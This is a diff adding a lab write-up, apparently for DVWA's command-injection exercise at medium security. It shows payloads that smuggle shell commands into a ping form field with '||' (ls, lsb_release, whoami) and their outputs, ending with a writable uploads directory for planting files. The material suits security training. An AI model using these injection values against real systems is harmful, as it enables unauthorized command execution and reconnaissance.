@@ -1,0 +1,55 @@
+Command execution:
+In this page, analyzing the source we can easily see that what the code
+actually do is to open a shell and run:
+
+$ ping -c 3 $target
+
+Where target is the content of a form field. A first guess is try to input
+something like "127.0.0.1; ls -lah" to force it to run ping on localhost and then
+ls, but the security level "medium" makes it useless to try to use ; or && to
+achieve this.
+
+We can, on the other hand, use ||, but for this one we have to make ping
+returns error code. We can do this with an input like "asd || ls -lah". This
+gives us a list of what is on the directory of the webapp:
+
+Result:
+drwxr-xr-x  4 root root 4.0K Apr 26  2011 .
+drwxr-xr-x 11 root root 4.0K Nov  3 09:40 ..
+drwxr-xr-x  2 root root 4.0K Apr 26  2011 help
+-rwxr-xr-x  1 root root 1.6K Apr 26  2011 index.php
+drwxr-xr-x  2 root root 4.0K Apr 26  2011 source
+
+Some other useful tries:
+
+$ a || lsb_release -a
+When ran on a linux server, this gets us info about what distribution and
+version are hosting the application.
+
+Result:
+Distributor ID: Debian
+Description:  Debian GNU/Linux 6.0.10 (squeeze)
+Release:  6.0.10
+Codename: squeeze
+
+& a || whoami
+Get the user logged in within the app.
+
+Result:
+www-data
+
+& a || ls -lah ../../hackable/uploads
+After some walking through the directories tree, we finally find a directory we
+can delete/create files. (Or even see some students trying to exploit other
+vulnerabilities XD)
+
+Result:
+total 20K
+drwxr-xr-x 2 www-data www-data 4.0K Nov  3 13:48 .
+drwxr-xr-x 4 www-data www-data 4.0K Apr 26  2011 ..
+-rwxr-xr-x 1 www-data www-data  667 Apr 26  2011 dvwa_email.png
+-rw-r--r-- 1 www-data www-data  631 Nov  3 13:48 stored_xss.jpeg
+-rw-r--r-- 1 www-data www-data   19 Jan 10  2015 test.jpg
+
+Finding a directory with this kind of permission is very valuable. We could
+insert files there and maybe, through another vulnerability, run them remotely.
